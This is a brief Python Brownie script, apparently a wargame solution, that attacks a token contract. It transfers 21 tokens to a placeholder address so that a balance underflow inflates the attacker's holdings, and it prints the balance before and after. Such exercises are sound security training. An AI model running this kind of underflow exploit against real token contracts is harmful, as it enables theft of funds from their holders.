from brownie import accounts, config, interface

def attack(token, hacker, fake_account):
    print(f'Balance before attack: {token.balanceOf(hacker)}')
    tx = token.transfer(fake_account, 21, {'from': hacker, 'allow_revert':True})
    tx.wait(2)
    print(f'Balance after attack: {token.balanceOf(hacker)}')

def main(target):
    token = interface.TokenInterface(target)
    hacker = accounts.add(config['wallets']['from_key'])
    fake_account = "0x00000000000000000000000000000000cafebabe"

    attack(token, hacker, fake_account)